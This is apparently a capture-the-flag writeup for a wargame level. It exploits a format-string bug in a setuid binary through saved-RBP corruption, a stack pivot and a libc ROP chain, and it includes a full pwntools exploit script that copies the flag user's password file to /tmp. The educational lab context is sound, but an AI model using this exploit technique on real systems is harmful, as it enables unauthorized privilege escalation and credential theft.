# Rainfall — level04 (`riviera`) — Writeup

## Target

```
-rwsr-x--- 1 flag04 level04 16584 Jun  9 23:13 riviera
```

- Setuid binary, owned by `flag04`, executable by `level04`
- `x86-64`, dynamically linked, not stripped
- Goal: escalate from `level04` to `flag04`

### Protections (`checksec`)

```
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

As with level03, no canary + no PIE + ASLR disabled on the host
(`cat /proc/sys/kernel/randomize_va_space` → `0`) means addresses are stable
across runs, which matters a lot for the technique below.

---

## The vulnerability

`display_entry()` passes attacker-controlled data **directly as a format
string**:

```c
static void display_entry(unsigned int idx)
{
    if (idx >= LOG_ENTRIES)
        return;
    printf("[RIVIERA] [%u] tag=", log_buf[idx].seq);
    printf(log_buf[idx].tag);              // <-- format string bug
    printf(" msg=%s\n", log_buf[idx].message);
}
```

`log_buf[idx].tag` is filled directly from user input in `handle_input()`:

```c
static void handle_input(void)
{
    char tag[TAG_SIZE];     // 32 bytes
    char msg[INPUT_SIZE];   // 256 bytes

    fgets(tag, TAG_SIZE, stdin);
    ...
    fgets(msg, INPUT_SIZE, stdin);
    ...
    log_message(tag, msg);              // strncpy's both into log_buf[idx]
    display_entry((log_seq - 1) % LOG_ENTRIES);
}
```

Both `fgets()` calls are correctly bounded — there's **no buffer overflow**
here, unlike level03. The bug is purely in *how* `tag` is used: passing
user-controlled text as `printf`'s format argument lets an attacker use `%x`,
`%s`, `%n`, `%hn`, etc. to read and write arbitrary memory, using the
program's own stack as the argument list.

### Confirming it

```
Tag: %x %x %x %x %x %x %x %x %x %x
Message: AAAABBBBCCCCDDDD
```
```
tag=ffffdfb0 404080 0 75 0 0 403e00 ffffe2a0 401533 41414141
```

The 10th `%x` printed `41414141` — the literal bytes of `"AAAA"`, the first
four bytes of our `msg` buffer. This confirms:

- On x86-64, `printf`'s first 6 variadic arguments come from registers
  (`rsi, rdx, rcx, r8, r9`, plus assorted leftover-register noise since this
  call site passes *zero* real arguments). Arguments from position 7 onward
  are read off the stack, 8 bytes per slot.
- **`msg`'s bytes land at argument position 10 onward**, one 8-byte slot per
  position. Since `msg` is 255 usable bytes (vs. `tag`'s 31), this is where
  we stage pointer values and/or a ROP chain for the write primitive to use.

---

## Why a simple GOT-hijack doesn't finish the job here

The first idea is the obvious one: use `%hn`/`%hhn` to overwrite `printf`'s
GOT entry so a later call jumps into `system()` or a `one_gadget`. This is
mechanically straightforward and was fully confirmed working during
exploitation — but it runs into a real structural wall:

- The **only** call site where the attacker controls the first argument
  (`rdi`) to the hijacked function is `printf(tag)` itself — `rdi` there is
  always `&log_buf[idx].tag`.
- `tag` is capped at **31 bytes**, and is the *same stored bytes* used both
  to perform the `%n` write **and** to serve as the hijacked function's
  argument on the next call. A 3-byte GOT write (`printf` → `system`/`execve`)
  alone costs ~29 of those 31 bytes, leaving no room for a useful command or
  path in the same buffer.
- `one_gadget`-based shortcuts (which hardcode their own `argv`/`envp` from
  whatever registers/stack happen to hold at the call site) do work
  mechanically, but any shell they spawn starts with `ruid != euid`. Without
  `-p`, the shell immediately — and in testing, *permanently* — drops **all**
  UID fields (real, effective, **and saved**), so there is no way to recover
  privilege from inside that shell afterward, no matter what's run there
  (confirmed: `setresuid()` called from inside such a shell consistently
  fails with `EPERM`, because the saved UID that would make it legal is
  already gone).

In short: GOT-hijacking only changes *which* function gets called at an
existing call site — it does not grant control over that call's other
arguments, and the one buffer we do control is too small to carry both a
write payload and a full ROP chain or command.

---

## The real exploit: corrupt the saved RBP, pivot the stack

`msg` has 255 bytes of room — more than enough for a full ROP chain — but no
call site ever passes its address as `rdi`/first-argument to anything. The
fix is to **move execution there directly** via a classic
**stack-pivot**, using the `%n` write to corrupt a saved frame pointer
instead of a GOT entry.

### Mechanism

```
display_entry:
    push   rbp          ; stores handle_input's rbp at this stack slot
    mov    rsp, rbp      ; display_entry's own rbp == &(that saved value)
    ...
    printf(tag)          ; our %hn write corrupts the two slots below
    ...
    leave                ; rbp = *rbp_slot   (now attacker-controlled!)
    ret                  ; rip = *(rbp_slot+8) (also attacker-controlled!)
```

A **double write** targets two adjacent 8-byte stack slots at
`display_entry`'s own `$rbp`:

- `rbp_slot` (the saved RBP) → corrupted to point at `msg_addr + 16`
- `rbp_slot + 8` (the saved return address) → corrupted to point at a
  `leave; ret` gadget already present in the binary's own code (here,
  `0x401377`)

When `display_entry`'s real epilogue runs, `leave` loads the corrupted RBP
and `ret` jumps straight into that second `leave;ret` gadget — which
immediately fires again, using the now-current `rbp` (`msg_addr + 16`) to
pivot `rsp` directly into the attacker's `msg` buffer and execute whatever
ROP chain is staged there. This happens in one controlled hop, with no
dependency on `handle_input`'s own stack frame surviving untouched
afterward (which an earlier, more fragile version of this exploit did rely
on, and which proved unreliable across different launch methods).

### The ROP chain, staged in `msg`

```
setreuid(1021, 1021)        ; 1021 = flag04's UID
ret ; ret                   ; 16-byte stack alignment before system()
system(cmd_addr)             ; cmd_addr points to a string later in msg
exit(3)
```

`cat /home/flag04/.pass > /tmp/.pass\x00` is placed directly after the chain
inside `msg`, and its address is computed and patched into the chain before
sending.

**Why `setreuid`, not `setuid`:** an unprivileged process can only move its
*effective* UID with `setuid()`. `setreuid()`/`setresuid()` can also move the
*real* UID — legally, without any special capability — as long as the target
value matches the process's current real, effective, **or saved** UID. Since
`riviera` is setuid to `flag04`, the saved UID is already `1021` at the
moment our chain runs, so this call succeeds and leaves `ruid == euid`
before `system()` ever spawns a shell — meaning that shell has no reason to
drop privilege on startup.

### The write itself

Two `%hn` directives in a single `tag`, each targeting one of the two
adjacent stack slots:

```python
c1 = rbp_slot_target_value & 0xffff
c2 = (leave_ret_gadget_value - c1) % 65536
tag = f'%{c1}c%10$hn%{c2}c%11$hn'
```

Both writes read their target *addresses* from `msg`'s argument positions 10
and 11 (the same mapping confirmed earlier with the `AAAA`/`BBBB` test), and
both only need to patch the low 16 bits, since the write target and its new
value share the same upper 48 bits (same stack page).

---

## Exploit script

```python
#!/usr/bin/env python3
from pwn import *
import os, time

context.arch = 'amd64'
context.log_level = 'error'

BINARY = '/home/level04/riviera'

RBP_SLOT_BASE = 0x7fffffffecc0
GADGET_LEAVE_RET = 0x401377

LIBC_BASE    = 0x7ffff7c00000
ROP_RDI      = p64(LIBC_BASE + 0x10f78b)
ROP_RSI_R15  = p64(LIBC_BASE + 0x10f789)
ROP_RET      = p64(LIBC_BASE + 0x02882f)
ROP_SYS      = p64(LIBC_BASE + 0x058750)
ROP_SETREUID = p64(LIBC_BASE + 0x1270d0)
ROP_EXIT     = p64(LIBC_BASE + 0x047ba0)
OWNER_UID    = p64(1021)
CMD = b'cat /home/flag04/.pass > /tmp/.pass\x00'


def build_payload(rbp_slot):
    ret_slot = rbp_slot + 8
    msg_addr = rbp_slot - 0x120          # msg sits 0x120 below handle_input's rbp
    f = msg_addr + 16
    p1, p2, junk = p64(rbp_slot), p64(ret_slot), p64(0)

    chain  = ROP_RDI + OWNER_UID
    chain += ROP_RSI_R15 + OWNER_UID + p64(0)
    chain += ROP_SETREUID
    chain += ROP_RDI
    chain += b'CMDADDR!'                  # patched below
    chain += ROP_RET
    chain += ROP_SYS
    chain += ROP_RDI
    chain += p64(3)
    chain += ROP_EXIT

    body = p1 + p2 + junk + chain
    cmd_addr = msg_addr + len(body)
    body = body.replace(b'CMDADDR!', p64(cmd_addr))
    msg = body + CMD

    low16_f, low16_g = f & 0xFFFF, GADGET_LEAVE_RET & 0xFFFF
    c1 = low16_f
    c2 = (low16_g - c1) % 65536
    tag = f'%{c1}c%10$hn%{c2}c%11$hn'.encode()

    if len(tag) >= 32 or len(msg) >= 256:
        return None, None
    return tag, msg


def attempt(rbp_slot):
    tag, msg = build_payload(rbp_slot)
    if tag is None:
        return False
    try:
        io = process(BINARY, env={})
        io.recvuntil(b'Tag: ', timeout=2)
        io.sendline(tag)
        io.recvuntil(b'Message: ', timeout=2)
        io.sendline(msg)
        io.recvall(timeout=1)
        io.close()
    except Exception:
        return False
    return os.path.exists('/tmp/.pass') and os.path.getsize('/tmp/.pass') > 0


def main():
    if os.path.exists('/tmp/.pass'):
        os.remove('/tmp/.pass')

    # try the known-good address first, then small neighbors, repeated a
    # few times each in case of run-to-run stack jitter
    deltas = [0] + [d for pair in zip(range(8, 65, 8), range(-8, -65, -8)) for d in pair]

    for round_num in range(5):
        for delta in deltas:
            candidate = RBP_SLOT_BASE + delta
            if attempt(candidate):
                print(f"\n[+] SUCCESS: RBP_SLOT={hex(candidate)} (round {round_num}, delta {delta})")
                print(open('/tmp/.pass').read())
                return
        time.sleep(0.1)

    print("\n[-] Exhausted retries without success.")


if __name__ == '__main__':
    main()
```

---

## Steps to reproduce

1. **Recon**
   ```bash
   file riviera
   checksec riviera
   cat /proc/sys/kernel/randomize_va_space
   ```

2. **Spot the format string bug** by reading the source
   (`printf(log_buf[idx].tag)` with no format specifier of its own) and
   confirm it live:
   ```
   Tag: %x %x %x %x %x %x %x %x %x %x
   Message: AAAABBBBCCCCDDDD
   ```
   Confirm `msg`'s bytes show up at a predictable `%N$` argument position.

3. **Find the stack-frame addresses.** Launch the target the *same way*
   the final exploit will (`pwntools.process()` uses a bare relative path,
   no custom environment) and measure through `gdbserver`, not plain
   `gdb run` — the two give different stack layouts because `gdb run`
   injects extra environment variables `gdbserver` doesn't:
   ```bash
   gdbserver :1234 ./riviera
   # second terminal:
   gdb ./riviera
   (gdb) target remote :1234
   (gdb) break *<printf(tag) call address>
   (gdb) continue
   (gdb) p/x $rbp          # the saved-RBP slot to target
   (gdb) x/gx $rbp         # its current value (handle_input's real rbp)
   ```
   Disassemble `handle_input` to find `msg`'s offset from its own `rbp`
   (the `lea -0x120(%rbp),%rax` before the second `fgets` call).

4. **Find a `leave; ret` gadget already in the binary** (for the second
   pivot stage) — any function's epilogue works:
   ```bash
   objdump -d riviera | grep -B2 ' ret' | grep -A2 leave
   ```

5. **Find the needed libc gadgets/symbols** (same libc, same technique as
   level03 — `ROPgadget` for `pop rdi`, a `pop rsi` variant, a bare `ret`
   for alignment, and `nm -D` for `setreuid`/`system`/`exit`).

6. **Build and run the exploit** (script above). The retry loop absorbs
   small, run-to-run stack offset jitter rather than requiring one
   perfectly precise address.

7. **Read the result:**
   ```bash
   cat /tmp/.pass
   ```

---

## Key lessons / pitfalls hit along the way

- **A format string bug doesn't require a buffer overflow.** Both `fgets()`
  calls here are perfectly size-bounded; the vulnerability is entirely in
  passing attacker data as the *format* argument rather than as a `%s`
  argument.
- **GOT hijacking only controls *which* function runs, not its other
  arguments.** When the only attacker-controlled buffer at the trigger call
  site is small and reused for both the write payload and the hijacked
  call's argument, a GOT overwrite can hit a hard capacity wall. A
  stack-pivot into a larger, otherwise-unused buffer sidesteps this
  entirely.
- **Embedding a null byte truncates a format string.** `printf(tag)` stops
  interpreting `tag` as soon as it hits `\x00`, exactly like any other C
  string function — a payload can't have a real path or command sitting
  *after* an embedded null and expect `printf` to still parse directives
  past it.
- **`/` is forbidden in filenames, but `%` and `$` are not.** When a
  hijacked call's argument must equal the write payload's own literal bytes,
  naming the target file after the format string itself is a legitimate way
  to satisfy both constraints at once (useful if sticking with the
  GOT-hijack approach instead of the stack pivot).
- **Measurement method must match delivery method, exactly.** `gdb run`,
  `gdbserver`, and `pwntools.process()` can each produce a different stack
  layout for the "same" program, because each launches it with slightly
  different environment variables or argv handling. `gdbserver :PORT
  ./binary` (matching the relative path `process()` uses) consistently
  matched real exploit runs in this series; plain `gdb run` did not.
- **A one-shot address is fragile; a small retry loop is robust.** Rather
  than chase one perfectly-measured stack address through repeated manual
  debugging, trying a handful of nearby candidate offsets across a few
  rounds absorbed the remaining run-to-run jitter far more reliably.
- **`setreuid`/`setresuid` succeed via the saved-UID rule, not via Linux
  capabilities.** An unprivileged process can restore its real UID to match
  its current saved UID with no special capability needed — but only if
  that saved UID hasn't already been wiped. A shell that starts with
  `ruid != euid` and no `-p` flag can permanently destroy the saved UID on
  startup, which is why this call must happen *before* any shell spawns,
  directly from the ROP chain itself.
